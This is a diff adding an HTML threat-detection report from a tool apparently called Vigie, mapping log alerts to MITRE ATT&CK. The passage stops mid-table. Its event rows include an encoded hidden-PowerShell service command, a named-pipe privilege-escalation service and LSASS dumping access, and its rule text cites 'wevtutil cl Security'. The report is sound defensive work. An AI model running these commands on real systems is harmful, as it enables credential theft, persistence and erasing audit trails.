@@ -1,0 +1,1353 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="generator" content="Vigie 0.1.0.dev0">
+<title>Vigie report</title>
+<style>
+:root {
+  --bg: #ffffff; --panel: #f6f7f9; --text: #1b1f24; --muted: #5b6470; --border: #d9dde3;
+  --link: #0b5cad; --code: #eef1f4;
+  --critical: #8e1b1b; --high: #c2410c; --medium: #a16207; --low: #1d4ed8; --informational: #4b5563;
+}
+@media (prefers-color-scheme: dark) {
+  :root {
+    --bg: #111418; --panel: #1a1f25; --text: #e6e9ed; --muted: #9aa4b0; --border: #2c333b;
+    --link: #7cb7ff; --code: #232a31;
+    --critical: #f87171; --high: #fb923c; --medium: #facc15; --low: #93c5fd; --informational: #cbd5e1;
+  }
+}
+* { box-sizing: border-box; }
+body { margin: 0; background: var(--bg); color: var(--text);
+  font: 15px/1.5 system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
+main { max-width: 1200px; margin: 0 auto; padding: 24px 16px 48px; }
+h1 { font-size: 1.6rem; margin: 0 0 4px; }
+h2 { font-size: 1.25rem; margin: 36px 0 12px; padding-bottom: 6px; border-bottom: 1px solid var(--border); }
+a { color: var(--link); }
+.muted { color: var(--muted); }
+.cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin-top: 16px; }
+.card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px; }
+.card .value { font-size: 1.5rem; font-weight: 600; }
+.card .label { color: var(--muted); font-size: .85rem; }
+.scroll { overflow-x: auto; }
+table { border-collapse: collapse; width: 100%; font-size: .9rem; }
+th, td { text-align: left; vertical-align: top; padding: 6px 8px; border-bottom: 1px solid var(--border); }
+th { color: var(--muted); font-weight: 600; white-space: nowrap; }
+td.time, td.nowrap { white-space: nowrap; }
+td.event { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: .82rem;
+  word-break: break-word; }
+.level { display: inline-block; min-width: 84px; padding: 1px 8px; border-radius: 10px; font-size: .78rem;
+  font-weight: 600; text-transform: uppercase; letter-spacing: .02em; color: var(--bg); text-align: center; }
+.level-informational { background: var(--informational); }
+.level-low { background: var(--low); }
+.level-medium { background: var(--medium); }
+.level-high { background: var(--high); }
+.level-critical { background: var(--critical); }
+details.alert { border: 1px solid var(--border); border-radius: 8px; margin: 10px 0; background: var(--panel); }
+details.alert > summary { cursor: pointer; padding: 10px 14px; display: flex; gap: 12px; align-items: baseline;
+  flex-wrap: wrap; }
+details.alert > summary .title { font-weight: 600; }
+details.alert .body { padding: 0 14px 12px; }
+dl { display: grid; grid-template-columns: max-content 1fr; gap: 4px 14px; margin: 8px 0 12px; }
+dt { color: var(--muted); }
+dd { margin: 0; }
+code { background: var(--code); padding: 1px 4px; border-radius: 4px; font-size: .85em; }
+footer { margin-top: 40px; color: var(--muted); font-size: .8rem; }
+</style>
+</head>
+<body>
+<main>
+<h1>Vigie report</h1>
+<p class="muted">Generated on 2026-09-28 15:17:49Z by Vigie 0.1.0.dev0.
+Alerts are mapped to MITRE ATT&amp;CK 19.2. All times are UTC.</p>
+
+<section class="cards" aria-label="Summary">
+  <div class="card"><div class="value">368</div><div class="label">events analyzed</div></div>
+  <div class="card"><div class="value">33</div><div class="label">files read</div></div>
+  <div class="card"><div class="value">35</div><div class="label">alerts (level low and above)</div></div>
+  <div class="card"><div class="value">0</div><div class="label"><span class="level level-critical">critical</span></div></div>
+  <div class="card"><div class="value">12</div><div class="label"><span class="level level-high">high</span></div></div>
+  <div class="card"><div class="value">20</div><div class="label"><span class="level level-medium">medium</span></div></div>
+  <div class="card"><div class="value">3</div><div class="label"><span class="level level-low">low</span></div></div>
+</section>
+<p class="muted">Time range: 2020-09-04 07:07:19Z to 2025-01-01 00:00:09Z. 23 rules loaded.
+16 alert(s) below the "low" level are not shown
+(informational: 16);
+run with <code>--min-level informational</code> to include them.
+</p>
+
+<h2>MITRE ATT&amp;CK</h2>
+<div class="scroll"><table>
+<thead><tr><th>Tactic</th><th>Alerts</th><th>Techniques</th></tr></thead>
+<tbody>
+<tr><td class="nowrap"><a href="https://attack.mitre.org/tactics/TA0001">Initial Access</a> <span class="muted">TA0001</span></td>
+<td>3</td>
+<td><a href="https://attack.mitre.org/techniques/T1078/003">T1078.003</a> Valid Accounts: Local Accounts</td></tr>
+<tr><td class="nowrap"><a href="https://attack.mitre.org/tactics/TA0002">Execution</a> <span class="muted">TA0002</span></td>
+<td>9</td>
+<td><a href="https://attack.mitre.org/techniques/T1053/005">T1053.005</a> Scheduled Task/Job: Scheduled Task<br><a href="https://attack.mitre.org/techniques/T1059/001">T1059.001</a> Command and Scripting Interpreter: PowerShell<br><a href="https://attack.mitre.org/techniques/T1197">T1197</a> BITS Jobs<br><a href="https://attack.mitre.org/techniques/T1569/002">T1569.002</a> System Services: Service Execution</td></tr>
+<tr><td class="nowrap"><a href="https://attack.mitre.org/tactics/TA0003">Persistence</a> <span class="muted">TA0003</span></td>
+<td>11</td>
+<td><a href="https://attack.mitre.org/techniques/T1053/005">T1053.005</a> Scheduled Task/Job: Scheduled Task<br><a href="https://attack.mitre.org/techniques/T1078/003">T1078.003</a> Valid Accounts: Local Accounts<br><a href="https://attack.mitre.org/techniques/T1136/001">T1136.001</a> Create Account: Local Account<br><a href="https://attack.mitre.org/techniques/T1136/002">T1136.002</a> Create Account: Domain Account<br><a href="https://attack.mitre.org/techniques/T1197">T1197</a> BITS Jobs<br><a href="https://attack.mitre.org/techniques/T1543/003">T1543.003</a> Create or Modify System Process: Windows Service</td></tr>
+<tr><td class="nowrap"><a href="https://attack.mitre.org/tactics/TA0004">Privilege Escalation</a> <span class="muted">TA0004</span></td>
+<td>9</td>
+<td><a href="https://attack.mitre.org/techniques/T1053/005">T1053.005</a> Scheduled Task/Job: Scheduled Task<br><a href="https://attack.mitre.org/techniques/T1078/003">T1078.003</a> Valid Accounts: Local Accounts<br><a href="https://attack.mitre.org/techniques/T1543/003">T1543.003</a> Create or Modify System Process: Windows Service<br><a href="https://attack.mitre.org/techniques/T1548/003">T1548.003</a> Abuse Elevation Control Mechanism: Sudo and Sudo Caching</td></tr>
+<tr><td class="nowrap"><a href="https://attack.mitre.org/tactics/TA0005">Stealth</a> <span class="muted">TA0005</span></td>
+<td>7</td>
+<td><a href="https://attack.mitre.org/techniques/T1027/010">T1027.010</a> Obfuscated Files or Information: Command Obfuscation<br><a href="https://attack.mitre.org/techniques/T1078/003">T1078.003</a> Valid Accounts: Local Accounts<br><a href="https://attack.mitre.org/techniques/T1197">T1197</a> BITS Jobs</td></tr>
+<tr><td class="nowrap"><a href="https://attack.mitre.org/tactics/TA0112">Defense Impairment</a> <span class="muted">TA0112</span></td>
+<td>3</td>
+<td><a href="https://attack.mitre.org/techniques/T1685/005">T1685.005</a> Disable or Modify Tools: Clear Windows Event Logs</td></tr>
+<tr><td class="nowrap"><a href="https://attack.mitre.org/tactics/TA0006">Credential Access</a> <span class="muted">TA0006</span></td>
+<td>19</td>
+<td><a href="https://attack.mitre.org/techniques/T1003/001">T1003.001</a> OS Credential Dumping: LSASS Memory<br><a href="https://attack.mitre.org/techniques/T1110/001">T1110.001</a> Brute Force: Password Guessing<br><a href="https://attack.mitre.org/techniques/T1110/003">T1110.003</a> Brute Force: Password Spraying</td></tr>
+<tr><td class="nowrap"><a href="https://attack.mitre.org/tactics/TA0011">Command and Control</a> <span class="muted">TA0011</span></td>
+<td>2</td>
+<td><a href="https://attack.mitre.org/techniques/T1105">T1105</a> Ingress Tool Transfer</td></tr>
+</tbody></table></div>
+
+<h2>Alerts</h2>
+<div class="scroll"><table>
+<thead><tr><th>Severity</th><th>Rule</th><th>Alerts</th><th>First seen</th><th>Last seen</th></tr></thead>
+<tbody>
+<tr><td><span class="level level-high">high</span></td><td>LSASS Memory Access With Credential Dumping Rights</td>
+<td>4</td><td class="time">2020-09-22 08:38:29Z</td><td class="time">2020-10-18 23:50:06Z</td></tr>
+<tr><td><span class="level level-high">high</span></td><td>SSH Login After Brute Force</td>
+<td>3</td><td class="time">2024-03-10 09:05:42Z</td><td class="time">2024-06-04 08:05:30Z</td></tr>
+<tr><td><span class="level level-high">high</span></td><td>Security Event Log Cleared</td>
+<td>2</td><td class="time">2020-10-18 02:17:00Z</td><td class="time">2020-10-21 11:28:08Z</td></tr>
+<tr><td><span class="level level-high">high</span></td><td>Suspicious Service Installed</td>
+<td>2</td><td class="time">2020-09-20 16:16:58Z</td><td class="time">2021-06-11 09:07:41Z</td></tr>
+<tr><td><span class="level level-high">high</span></td><td>Important Windows Event Log Cleared</td>
+<td>1</td><td class="time">2020-10-21 11:28:08Z</td><td class="time">2020-10-21 11:28:08Z</td></tr>
+<tr><td><span class="level level-medium">medium</span></td><td>SSH Brute Force</td>
+<td>9</td><td class="time">2024-03-10 09:05:42Z</td><td class="time">2024-07-08 03:12:20Z</td></tr>
+<tr><td><span class="level level-medium">medium</span></td><td>File Download Via Bitsadmin</td>
+<td>2</td><td class="time">2020-10-23 06:36:43Z</td><td class="time">2020-10-23 06:36:43Z</td></tr>
+<tr><td><span class="level level-medium">medium</span></td><td>PowerShell Encoded Command Execution</td>
+<td>2</td><td class="time">2020-09-20 06:57:49Z</td><td class="time">2020-09-20 06:57:49Z</td></tr>
+<tr><td><span class="level level-medium">medium</span></td><td>SSH Password Spraying</td>
+<td>2</td><td class="time">2024-03-10 09:05:42Z</td><td class="time">2024-06-03 14:39:50Z</td></tr>
+<tr><td><span class="level level-medium">medium</span></td><td>Suspicious Scheduled Task Created</td>
+<td>2</td><td class="time">2020-09-21 07:15:47Z</td><td class="time">2020-12-19 07:00:22Z</td></tr>
+<tr><td><span class="level level-medium">medium</span></td><td>Local User Account Created</td>
+<td>1</td><td class="time">2024-03-10 09:08:12Z</td><td class="time">2024-03-10 09:08:12Z</td></tr>
+<tr><td><span class="level level-medium">medium</span></td><td>PsExec-Like Service Installed</td>
+<td>1</td><td class="time">2020-10-19 03:30:46Z</td><td class="time">2020-10-19 03:30:46Z</td></tr>
+<tr><td><span class="level level-medium">medium</span></td><td>Windows Logon Brute Force From Single Source</td>
+<td>1</td><td class="time">2020-10-22 08:29:55Z</td><td class="time">2020-10-22 08:29:55Z</td></tr>
+<tr><td><span class="level level-low">low</span></td><td>Sudo Authentication Failure</td>
+<td>2</td><td class="time">2024-03-10 09:09:30Z</td><td class="time">2024-06-04 08:07:12Z</td></tr>
+<tr><td><span class="level level-low">low</span></td><td>User Account Created</td>
+<td>1</td><td class="time">2020-09-14 12:06:03Z</td><td class="time">2020-09-14 12:06:03Z</td></tr>
+</tbody></table></div>
+<h3>Details</h3>
+<details class="alert" id="alert-1" open>
+<summary><span class="level level-high">high</span>
+<span class="title">Suspicious Service Installed</span>
+<span class="muted">2020-09-20 16:16:58Z &middot; WORKSTATION6.theshire.local &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>Detects a new Windows service (System event 7045) whose command line runs a shell, a script host or a LOLBin, writes into a named pipe, starts a program from an admin share or a temporary or user folder, or names a program without its folder. Attackers install such services to run code as SYSTEM, to move laterally (Impacket, Cobalt Strike, Empire, sc.exe) or to escalate privileges with the named pipe &#34;getsystem&#34; trick.</p>
+<dl>
+  <dt>When</dt><dd>2020-09-20 16:16:58Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1543/003">T1543.003</a> Create or Modify System Process: Windows Service; <a href="https://attack.mitre.org/techniques/T1569/002">T1569.002</a> System Services: Service Execution <span class="muted">(Execution, Persistence, Privilege Escalation)</span></dd>
+  <dt>Rule</dt><dd>Suspicious Service Installed <code>6d03b054-8230-47ba-a957-6b59a2d71c33</code></dd>
+  <dt>Author</dt><dd>pH-T (Nextron Systems), Florian Roth (Nextron Systems), Teymur Kheirkhabarov, Ecco, oscd.community, Natalia Shornikova (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Installers or updaters that register a temporary service from C:\Windows\Temp or a user folder; Administrators or management tools that wrap a script in a service with cmd.exe or PowerShell; Deployment or scanning tools that copy their agent through the ADMIN$ share and start it as a service</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-09-20 16:16:58Z</td><td class="nowrap">WORKSTATION6.theshire.local</td><td class="nowrap">empire_psexec_dcerpc_tcp_svcctl_service_excerpt.json:2</td><td class="event">ServiceName=Updater ImagePath=%COMSPEC% /C start /b C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJ…</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-2" open>
+<summary><span class="level level-high">high</span>
+<span class="title">LSASS Memory Access With Credential Dumping Rights</span>
+<span class="muted">2020-09-22 08:38:29Z &middot; WORKSTATION5.theshire.local &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>Detects a process opening LSASS (Sysmon event 10) with the access rights that Mimikatz, ProcDump, comsvcs.dll MiniDump, Task Manager dumps and similar tools request to read or patch its memory. LSASS memory holds the password hashes, Kerberos tickets and sometimes clear-text passwords of logged-on users.</p>
+<dl>
+  <dt>When</dt><dd>2020-09-22 08:38:29Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1003/001">T1003.001</a> OS Credential Dumping: LSASS Memory <span class="muted">(Credential Access)</span></dd>
+  <dt>Rule</dt><dd>LSASS Memory Access With Credential Dumping Rights <code>cbea5c72-bafb-4200-b58d-fa251eeef003</code></dd>
+  <dt>Author</dt><dd>Samir Bousseaden, Michael Haag, Florian Roth (Nextron Systems) (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Antivirus, EDR, backup or monitoring agents that inspect LSASS (add their exact paths as filters); Process inspection that reads module or handle details of every process, such as Process Explorer or PowerShell Get-Process output serialized over WinRM (0x1410, 0x1f3fff); Administrators dumping LSASS on purpose for troubleshooting with ProcDump or Task Manager; Windows installed on a drive other than C:, where the filters do not apply</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-09-22 08:38:29Z</td><td class="nowrap">WORKSTATION5.theshire.local</td><td class="nowrap">rdp_interactive_taskmanager_lsass_dump_excerpt.json:7</td><td class="event">SourceImage=C:\windows\system32\taskmgr.exe TargetImage=C:\windows\system32\lsass.exe GrantedAccess=0x1fffff</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-3" open>
+<summary><span class="level level-high">high</span>
+<span class="title">LSASS Memory Access With Credential Dumping Rights</span>
+<span class="muted">2020-09-22 08:38:29Z &middot; WORKSTATION5.theshire.local &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>Detects a process opening LSASS (Sysmon event 10) with the access rights that Mimikatz, ProcDump, comsvcs.dll MiniDump, Task Manager dumps and similar tools request to read or patch its memory. LSASS memory holds the password hashes, Kerberos tickets and sometimes clear-text passwords of logged-on users.</p>
+<dl>
+  <dt>When</dt><dd>2020-09-22 08:38:29Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1003/001">T1003.001</a> OS Credential Dumping: LSASS Memory <span class="muted">(Credential Access)</span></dd>
+  <dt>Rule</dt><dd>LSASS Memory Access With Credential Dumping Rights <code>cbea5c72-bafb-4200-b58d-fa251eeef003</code></dd>
+  <dt>Author</dt><dd>Samir Bousseaden, Michael Haag, Florian Roth (Nextron Systems) (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Antivirus, EDR, backup or monitoring agents that inspect LSASS (add their exact paths as filters); Process inspection that reads module or handle details of every process, such as Process Explorer or PowerShell Get-Process output serialized over WinRM (0x1410, 0x1f3fff); Administrators dumping LSASS on purpose for troubleshooting with ProcDump or Task Manager; Windows installed on a drive other than C:, where the filters do not apply</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-09-22 08:38:29Z</td><td class="nowrap">WORKSTATION5.theshire.local</td><td class="nowrap">rdp_interactive_taskmanager_lsass_dump_excerpt.json:8</td><td class="event">SourceImage=C:\windows\system32\taskmgr.exe TargetImage=C:\windows\system32\lsass.exe GrantedAccess=0x1fffff</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-4" open>
+<summary><span class="level level-high">high</span>
+<span class="title">Security Event Log Cleared</span>
+<span class="muted">2020-10-18 02:17:00Z &middot; WORKSTATION5 &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>Detects the clearing of the Windows Security audit log (event 1102), e.g. with &#34;wevtutil cl Security&#34; or Clear-EventLog. Attackers clear it to erase the record of their logons and actions.</p>
+<dl>
+  <dt>When</dt><dd>2020-10-18 02:17:00Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1685/005">T1685.005</a> Disable or Modify Tools: Clear Windows Event Logs <span class="muted">(Defense Impairment)</span></dd>
+  <dt>Rule</dt><dd>Security Event Log Cleared <code>bbb4b441-8965-4e18-8efe-12bec2b08423</code></dd>
+  <dt>Author</dt><dd>Florian Roth (Nextron Systems) (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Rollout of log collection agents (the setup routine often includes a reset of the local Eventlog); System provisioning (system reset before the golden image creation); Lab and test machines whose logs are cleared before each capture</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-10-18 02:17:00Z</td><td class="nowrap">WORKSTATION5</td><td class="nowrap">wmic_remote_xsl_jscript_excerpt.json:2</td><td class="event">The audit log was cleared. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Domain Name: WORKSTATION5 Logon ID: 0x13899EA</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-5" open>
+<summary><span class="level level-high">high</span>
+<span class="title">LSASS Memory Access With Credential Dumping Rights</span>
+<span class="muted">2020-10-18 23:50:06Z &middot; WORKSTATION5 &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>Detects a process opening LSASS (Sysmon event 10) with the access rights that Mimikatz, ProcDump, comsvcs.dll MiniDump, Task Manager dumps and similar tools request to read or patch its memory. LSASS memory holds the password hashes, Kerberos tickets and sometimes clear-text passwords of logged-on users.</p>
+<dl>
+  <dt>When</dt><dd>2020-10-18 23:50:06Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1003/001">T1003.001</a> OS Credential Dumping: LSASS Memory <span class="muted">(Credential Access)</span></dd>
+  <dt>Rule</dt><dd>LSASS Memory Access With Credential Dumping Rights <code>cbea5c72-bafb-4200-b58d-fa251eeef003</code></dd>
+  <dt>Author</dt><dd>Samir Bousseaden, Michael Haag, Florian Roth (Nextron Systems) (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Antivirus, EDR, backup or monitoring agents that inspect LSASS (add their exact paths as filters); Process inspection that reads module or handle details of every process, such as Process Explorer or PowerShell Get-Process output serialized over WinRM (0x1410, 0x1f3fff); Administrators dumping LSASS on purpose for troubleshooting with ProcDump or Task Manager; Windows installed on a drive other than C:, where the filters do not apply</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-10-18 23:50:06Z</td><td class="nowrap">WORKSTATION5</td><td class="nowrap">psh_lsass_memory_dump_comsvcs_excerpt.json:2</td><td class="event">SourceImage=C:\Windows\System32\rundll32.exe TargetImage=C:\windows\system32\lsass.exe GrantedAccess=0x1410</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-6" open>
+<summary><span class="level level-high">high</span>
+<span class="title">LSASS Memory Access With Credential Dumping Rights</span>
+<span class="muted">2020-10-18 23:50:06Z &middot; WORKSTATION5 &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>Detects a process opening LSASS (Sysmon event 10) with the access rights that Mimikatz, ProcDump, comsvcs.dll MiniDump, Task Manager dumps and similar tools request to read or patch its memory. LSASS memory holds the password hashes, Kerberos tickets and sometimes clear-text passwords of logged-on users.</p>
+<dl>
+  <dt>When</dt><dd>2020-10-18 23:50:06Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1003/001">T1003.001</a> OS Credential Dumping: LSASS Memory <span class="muted">(Credential Access)</span></dd>
+  <dt>Rule</dt><dd>LSASS Memory Access With Credential Dumping Rights <code>cbea5c72-bafb-4200-b58d-fa251eeef003</code></dd>
+  <dt>Author</dt><dd>Samir Bousseaden, Michael Haag, Florian Roth (Nextron Systems) (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Antivirus, EDR, backup or monitoring agents that inspect LSASS (add their exact paths as filters); Process inspection that reads module or handle details of every process, such as Process Explorer or PowerShell Get-Process output serialized over WinRM (0x1410, 0x1f3fff); Administrators dumping LSASS on purpose for troubleshooting with ProcDump or Task Manager; Windows installed on a drive other than C:, where the filters do not apply</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-10-18 23:50:06Z</td><td class="nowrap">WORKSTATION5</td><td class="nowrap">psh_lsass_memory_dump_comsvcs_excerpt.json:1</td><td class="event">SourceImage=C:\Windows\System32\rundll32.exe TargetImage=C:\windows\system32\lsass.exe GrantedAccess=0x1fffff</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-7" open>
+<summary><span class="level level-high">high</span>
+<span class="title">Security Event Log Cleared</span>
+<span class="muted">2020-10-21 11:28:08Z &middot; WORKSTATION5 &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>Detects the clearing of the Windows Security audit log (event 1102), e.g. with &#34;wevtutil cl Security&#34; or Clear-EventLog. Attackers clear it to erase the record of their logons and actions.</p>
+<dl>
+  <dt>When</dt><dd>2020-10-21 11:28:08Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1685/005">T1685.005</a> Disable or Modify Tools: Clear Windows Event Logs <span class="muted">(Defense Impairment)</span></dd>
+  <dt>Rule</dt><dd>Security Event Log Cleared <code>bbb4b441-8965-4e18-8efe-12bec2b08423</code></dd>
+  <dt>Author</dt><dd>Florian Roth (Nextron Systems) (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Rollout of log collection agents (the setup routine often includes a reset of the local Eventlog); System provisioning (system reset before the golden image creation); Lab and test machines whose logs are cleared before each capture</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-10-21 11:28:08Z</td><td class="nowrap">WORKSTATION5</td><td class="nowrap">cmd_discover_iexplorer_version_registry_excerpt.json:1</td><td class="event">The audit log was cleared. Subject: Security ID: S-1-5-21-3940915590-64593676-1414006259-500 Account Name: wardog Domain Name: WORKSTATION5 Logon ID: 0xC61D9</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-8" open>
+<summary><span class="level level-high">high</span>
+<span class="title">Important Windows Event Log Cleared</span>
+<span class="muted">2020-10-21 11:28:08Z &middot; WORKSTATION5 &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>Detects the clearing of a core Windows event log (System, Security, Sysmon or PowerShell) reported by the Eventlog service as System event 104; clearing the Security log is normally reported as Security event 1102, covered by the Security Event Log Cleared rule. Attackers clear these logs to hide their tracks.</p>
+<dl>
+  <dt>When</dt><dd>2020-10-21 11:28:08Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1685/005">T1685.005</a> Disable or Modify Tools: Clear Windows Event Logs <span class="muted">(Defense Impairment)</span></dd>
+  <dt>Rule</dt><dd>Important Windows Event Log Cleared <code>e28d89fc-b094-4869-be4d-63c90efcdd22</code></dd>
+  <dt>Author</dt><dd>Florian Roth (Nextron Systems), Tim Shelton, Nasreddine Bencherchali (Nextron Systems) (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Rollout of log collection agents (the setup routine often includes a reset of the local Eventlog); System provisioning (system reset before the golden image creation); Lab and test machines whose logs are cleared before each capture</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2020-10-21 11:28:08Z</td><td class="nowrap">WORKSTATION5</td><td class="nowrap">cmd_discover_iexplorer_version_registry_excerpt.json:2</td><td class="event">The System log file was cleared.</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-9" open>
+<summary><span class="level level-high">high</span>
+<span class="title">Suspicious Service Installed</span>
+<span class="muted">2021-06-11 09:07:41Z &middot; WORKSTATION5 &middot; 1 event(s)</span></summary>
+<div class="body">
+<p>Detects a new Windows service (System event 7045) whose command line runs a shell, a script host or a LOLBin, writes into a named pipe, starts a program from an admin share or a temporary or user folder, or names a program without its folder. Attackers install such services to run code as SYSTEM, to move laterally (Impacket, Cobalt Strike, Empire, sc.exe) or to escalate privileges with the named pipe &#34;getsystem&#34; trick.</p>
+<dl>
+  <dt>When</dt><dd>2021-06-11 09:07:41Z</dd>
+  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1543/003">T1543.003</a> Create or Modify System Process: Windows Service; <a href="https://attack.mitre.org/techniques/T1569/002">T1569.002</a> System Services: Service Execution <span class="muted">(Execution, Persistence, Privilege Escalation)</span></dd>
+  <dt>Rule</dt><dd>Suspicious Service Installed <code>6d03b054-8230-47ba-a957-6b59a2d71c33</code></dd>
+  <dt>Author</dt><dd>pH-T (Nextron Systems), Florian Roth (Nextron Systems), Teymur Kheirkhabarov, Ecco, oscd.community, Natalia Shornikova (SigmaHQ), adapted by Bouliw <span class="muted">(rule licensed under DRL-1.1)</span></dd>
+<dt>False positives</dt><dd>Installers or updaters that register a temporary service from C:\Windows\Temp or a user folder; Administrators or management tools that wrap a script in a service with cmd.exe or PowerShell; Deployment or scanning tools that copy their agent through the ADMIN$ share and start it as a service</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2021-06-11 09:07:41Z</td><td class="nowrap">WORKSTATION5</td><td class="nowrap">aptsimulator_cobaltstrike_service_excerpt.json:2</td><td class="event">ServiceName=tbbd05 ImagePath=%COMSPEC% echo /c b6a1458f396 &gt; \\.\pipe\334485</td></tr>
+</tbody></table></div>
+</div>
+</details>
+<details class="alert" id="alert-10" open>
+<summary><span class="level level-high">high</span>
+<span class="title">SSH Login After Brute Force</span>
+<span class="muted">2024-03-10 09:05:42Z &middot; web01 &middot; 11 event(s)</span></summary>
+<div class="body">
+<p>A successful SSH login from an address whose SSH brute force alert fired in the previous 10 minutes. The attacker has most likely guessed a valid password.</p>
+<dl>
+  <dt>When</dt><dd>2024-03-10 09:05:42Z to 2024-03-10 09:07:05Z</dd>
+<dt>Grouped by</dt><dd><code>src_ip = 203.0.113.45</code> </dd>  <dt>ATT&amp;CK</dt><dd><a href="https://attack.mitre.org/techniques/T1078/003">T1078.003</a> Valid Accounts: Local Accounts; <a href="https://attack.mitre.org/techniques/T1110/001">T1110.001</a> Brute Force: Password Guessing <span class="muted">(Initial Access, Persistence, Privilege Escalation, Stealth, Credential Access)</span></dd>
+  <dt>Rule</dt><dd>SSH Login After Brute Force <code>156d0b6d-aea1-479c-91ce-eaf6c08cfa67</code> (correlation)</dd>
+  <dt>Author</dt><dd>Bouliw</dd>
+<dt>False positives</dt><dd>A legitimate user who retried many times before remembering the password; A login from an address shared with a host that retries a stale password (NAT gateway, jump host, backup server)</dd></dl>
+<div class="scroll"><table>
+<thead><tr><th>Time</th><th>Host</th><th>Origin</th><th>Event</th></tr></thead>
+<tbody>
+<tr><td class="time">2024-03-10 09:05:42Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:6</td><td class="event">Failed password for invalid user oracle from 203.0.113.45 port 40022 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:05:49Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:7</td><td class="event">Failed password for root from 203.0.113.45 port 40030 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:05:56Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:8</td><td class="event">Failed password for root from 203.0.113.45 port 40038 ssh2</td></tr>
+<tr><td class="time">2024-03-10 09:06:03Z</td><td class="nowrap">web01</td><td class="nowrap">auth.log:9</td><td class="event">Failed password for invalid user admin from 203.0.113.45 port 40046 ssh2</td></tr>
